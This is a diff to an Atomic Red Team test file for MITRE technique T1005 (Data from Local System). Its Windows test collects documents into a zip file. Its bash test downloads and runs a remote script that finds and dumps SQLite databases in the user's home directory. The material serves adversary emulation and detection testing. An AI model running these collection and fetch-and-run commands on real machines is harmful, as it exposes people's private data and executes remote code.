@@ -1,7 +1,7 @@
 attack_technique: T1005
 display_name: Data from Local System
 atomic_tests:
-- name: Search files of interest and save them to a single zip file (Windows)                                  
+- name: Search files of interest and save them to a single zip file (Windows)
   auto_generated_guid: d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
   description: |
     This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              
@@ -17,7 +17,8 @@ atomic_tests:
       type: Path
       default: PathToAtomicsFolder\..\ExternalPayloads\T1005
     file_extensions:
-      description: List of file extensions to be searched and zipped, separated by comma and space
+      description: List of file extensions to be searched and zipped, separated by
+        comma and space
       type: string
       default: .doc, .docx, .txt
   executor:
@@ -53,7 +54,9 @@ atomic_tests:
 
     name: powershell
     elevation_required: false
-- name: Find and dump sqlite databases (Linux)
+  run_on:
+  - windows
+- name: Find and dump sqlite databases (FreeBSD and Linux)
   auto_generated_guid: 00cbb875-7ae4-4cf1-b638-e543fd825300
   description: |
     An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
@@ -63,10 +66,11 @@ atomic_tests:
     remote_url:
       description: url of remote payload
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
+      default: 
+        https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
   dependencies:
   - description: |
-      Check if running on a Debian based machine.
+      Check if running on a Debian or FreeBSD based machine.
     prereq_command: |
       if [ -x "$(command -v sqlite3)" ]; then echo "sqlite3 is installed"; else echo "sqlite3 is NOT installed"; exit 1; fi
       if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
@@ -74,17 +78,22 @@ atomic_tests:
     get_prereq_command: |
       if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
       if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+      if grep -iq "freebsd" /etc/os-release; then pkg update -y && pkg install -y bash binutils curl sqlite3; fi
   executor:
     name: bash
     elevation_required: false
     command: |
-        cd $HOME
-        curl -O #{remote_url}/art
-        curl -O #{remote_url}/gta.db
-        curl -O #{remote_url}/sqlite_dump.sh
-        chmod +x sqlite_dump.sh
-        find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+      cd $HOME
+      curl -O #{remote_url}/art
+      curl -O #{remote_url}/gta.db
+      curl -O #{remote_url}/sqlite_dump.sh
+      chmod +x sqlite_dump.sh
+      find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
     cleanup_command: |
-        rm -f $HOME/.art
-        rm -f $HOME/gta.db
-        rm -f $HOME/sqlite_dump.sh 
+      rm -f $HOME/.art
+      rm -f $HOME/gta.db
+      rm -f $HOME/sqlite_dump.sh 
+  run_on:
+  - freebsd
+  - linux
+
